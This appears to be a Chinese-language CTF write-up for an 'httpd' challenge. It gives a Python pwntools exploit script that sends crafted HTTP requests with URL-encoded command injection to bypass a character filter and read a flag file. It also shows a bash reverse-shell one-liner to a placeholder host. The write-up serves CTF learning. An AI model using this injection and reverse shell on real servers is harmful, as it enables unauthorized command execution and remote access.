---
data: 2024-09-10 10:55
challenge: httpd
tags:
  - misc
  - URLencode
---

这道题非常抽象，我的做法是 `%xx` url 编码绕过检查：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc
context.log_level = "debug"


def get_payload(command):
    payload = b"get /" + command + b" HTTP/1.0\r\n"
    payload += b"Host: 127.0.0.1\r\n"
    payload += f"Content-Length: 100\r\n".encode()
    payload += b"Content-Type: application/x-www-form-urlencoded\r\n"
    payload += b"Connection: close\r\n"
    payload += b"\r\n"
    return payload


# payload = get_payload(b"cat%20/fla*>/home/ctf/html/index.html")
payload = get_payload(b"index.html")
s(payload)

ia()

# 73037178244216013737456202378991
```

还有一种做法是远程开反弹 shell 连接到服务器，首先指定 `'GET /"s"h HTTP/1.0\r\n'` 起一个 shell，再传反弹 shell 的 payload：

```bash
'bash -c "bash -i >& /dev/tcp/xx.xx.xx.xx/xxxxx 0>&1"'
```

总而言之这道题的难点看起来就是绕过字符过滤。
